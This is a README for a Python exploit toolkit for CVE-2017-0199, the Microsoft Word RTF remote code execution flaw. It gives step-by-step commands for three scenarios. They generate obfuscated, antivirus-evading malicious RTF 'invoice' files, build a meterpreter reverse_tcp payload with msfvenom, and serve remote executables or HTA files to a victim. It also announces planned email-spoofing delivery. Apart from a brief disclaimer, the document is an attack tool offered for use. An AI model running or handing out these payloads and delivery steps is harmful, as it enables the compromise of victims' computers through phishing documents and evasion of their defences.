## Exploit toolkit CVE-2017-0199 - v3.0

Exploit toolkit CVE-2017-0199 - v3.0 is a handy python script which provides a quick and effective way to exploit Microsoft RTF RCE. It could generate a malicious (Obfuscated) RTF file and deliver metasploit / meterpreter / other payload to victim without any complex configuration.

### Video tutorial (for v2.0)

https://youtu.be/42LjG7bAvpg

### Release note:

Introduced following capabilities to the script

	- Generate Malicious Obfuscated RTF file ( using -x option ) to bypass AV
##### Detection rate before obfuscation

![alt tag](https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/v2.0-beta-3/Invoice_Normal.jpeg)
##### Detection rate after obfuscation:
![alt tag](https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/v2.0-beta-3/Invoice_Obfuscated.jpeg)

	- Deliver custom HTA file ( using -H option )
	- Deliver remote payload

Version: Python version 2.7.13

### Future release:

Working on following feature

	- Automatically send generated malicious RTF to victim using email spoofing
	

### Scenario 1: Deliver local payload
###### Example commands
	1) Generate malicious RTF file
	   # python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 1
	2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler
	   # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > /tmp/shell.exe
	   # msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run"
	3) Start toolkit in exploit mode to deliver local payload
	   # python cve-2017-0199_toolkit.py -M exp -e http://192.168.56.1/shell.exe -l /tmp/shell.exe
###### Sequence diagram

![alt tag](https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/v3.0-beta-2.0/Scenario1.jpg)


### Scenario 2: Deliver Remote payload
###### Example commands
	1) Generate malicious RTF file
	   # python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 1
	2) Start toolkit in exploit mode to deliver remote payload
	   # python cve-2017-0199_toolkit.py -M exp -e http://remoteserver.com/shell.exe
###### Sequence diagram

![alt tag](https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/v3.0-beta-2.0/Scenario2.jpg)


### Scenario 3: Deliver custom HTA file
###### Example commands
	1) Generate malicious RTF file
	   # python cve-2017-0199_toolkit.py -M gen -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 1
	2) Start toolkit in exploit mode to deliver custom HTA file
	   # python cve-2017-0199_toolkit.py -M exp -H /tmp/custom.hta
###### Sequence diagram

![alt tag](https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/v3.0-beta-2.0/Scenario3.jpg)


### Command line arguments:

    # python cve-2017-0199_toolkit.py -h

    This is a handy toolkit to exploit CVE-2017-0199 (Microsoft Word RTF RCE)

    Modes:

    -M gen                                          Generate Malicious RTF file only

         Generate malicious RTF file:

          -w <Filename.rtf>                   Name of malicious RTF file (Share this file with victim).

          -u <http://attacker.com/test.hta>   The path to an hta file. Normally, this should be a domain or IP where        this                                          tool is running.
	                                      For example, http://attackerip.com/test.hta (This URL will be included in 	                                              malicious RTF file and will be requested once victim will open malicious RTF file.
          -x 0|1  (default = 0)               Generate obfuscated RTF file. 0 = Disable, 1 = Enable.

					      
    -M exp                                          Start exploitation mode

         Exploitation:
	 
          -H </tmp/custom.hta>                Local path of a custom HTA file which needs to be delivered and executed on target.
	                                          NOTE: This option will not deliver payloads specified through options "-e" and "-l"
						  
          -p <TCP port:Default 80>            Local port number.

          -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

          -l </tmp/shell.exe>                 If payload is hosted locally, specify local path of an executable file / meterpreter shell / payload.


### Disclaimer

This program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (bhdresh) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using this program you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not bhdresh's responsibility.

### Credit

@nixawk for RTF sample, @bhdresh

### Bug, issues, feature requests

Obviously, I am not a fulltime developer so expect some hiccups

Please report bugs, issues through https://github.com/bhdresh/CVE-2017-0199/issues/new
